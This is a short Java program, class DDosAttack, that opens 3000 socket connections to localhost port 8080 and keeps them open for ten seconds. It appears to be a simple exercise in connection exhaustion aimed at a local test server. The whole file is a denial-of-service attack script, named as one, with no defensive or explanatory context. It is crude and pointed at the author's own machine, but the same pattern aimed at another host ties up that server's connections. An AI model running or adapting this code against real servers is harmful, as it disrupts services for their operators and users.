package com.rohit;

import java.io.IOException;
import java.net.Socket;

public class DDosAttack {
    public static void main(String[] args) throws IOException, InterruptedException {
        Socket[] sockets = new Socket[3000];
        for(int i=0; i< sockets.length; i++) {
            sockets[i] = new Socket("localhost", 8080);
        }

        Thread.sleep(10_000);
    }
}
